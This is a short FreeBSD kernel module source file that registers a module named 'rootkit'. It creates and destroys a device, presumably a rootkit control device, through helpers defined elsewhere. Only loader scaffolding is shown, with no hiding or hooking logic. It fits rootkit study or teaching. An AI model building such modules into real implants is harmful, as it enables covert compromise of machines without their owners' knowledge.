#include <sys/param.h>
#include <sys/errno.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/systm.h>

#include "interface.h"

static int load(module_t module, int cmd, void *arg) {
	(void)module;
	(void)arg;

	int error = 0;

  	switch (cmd) {
    case MOD_LOAD:
        error = make_rk_dev();

        if (error == 0)
            printf("rootkit: module loaded\n");

        break;

    case MOD_UNLOAD:
        destroy_rk_dev();
        printf("rootkit: module unloaded\n");
        break;

    case MOD_SHUTDOWN:
        break;

    default:
        error = EOPNOTSUPP;
        break;
    }

    return error;
}


static moduledata_t rootkit_module = {
	"rootkit",
	load,
	NULL
};

DECLARE_MODULE(rootkit, rootkit_module, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);